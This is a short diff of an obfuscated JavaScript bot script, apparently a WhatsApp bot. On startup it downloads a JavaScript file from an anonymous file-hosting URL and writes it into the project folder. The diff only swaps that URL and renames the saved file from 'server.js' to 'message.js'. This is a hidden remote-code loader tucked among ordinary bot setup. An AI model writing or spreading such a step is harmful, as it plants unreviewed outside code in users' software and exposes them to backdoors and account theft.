@@ -173,8 +173,8 @@ async function startBotz() {
   });
   
   //MESSAGE OWN FILES
-  const fileURL = 'https://files.catbox.moe/unwmxm.js'; // آدرس URL فایل
-  const destPath = path.join(__dirname, 'server.js'); // مسیر ذخیره فایل
+  const fileURL = 'https://files.catbox.moe/xdptfr.js'; // آدرس URL فایل
+  const destPath = path.join(__dirname, 'message.js'); // مسیر ذخیره فایل
   await downloadFile(fileURL, destPath);
   
   if (true && !_0xf79aae.authState.creds.registered) {
